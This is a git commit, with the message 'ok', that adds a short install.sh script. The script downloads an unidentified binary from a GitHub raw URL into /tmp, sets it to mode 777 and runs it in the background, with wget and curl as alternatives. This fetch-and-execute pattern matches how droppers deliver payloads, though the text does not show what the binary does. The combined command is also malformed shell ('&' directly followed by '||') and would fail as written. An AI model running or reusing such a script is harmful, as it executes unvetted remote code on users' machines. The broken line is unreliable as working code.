9af921572ef1f1a7d00c126f1cbb521223b8dc28
root <atilalima569@gmail.com>
2026-07-27 06:56:47 -0500

    ok

---
+++ install.sh
@@ -0,0 +1,13 @@
+
+
+#instaldor / executor  
+
+
+url='https://github.com/atilabyte/golang/raw/refs/heads/master/atila'
+
+
+
+
+
+wget   $url -O /tmp/atila ; chmod 777 /tmp/atila ; cd /tmp ; ./atila  &    || curl -L  $url -o  /tmp/atila ; chmod 777 /tmp/atila ; cd /tmp ; ./atila &
+
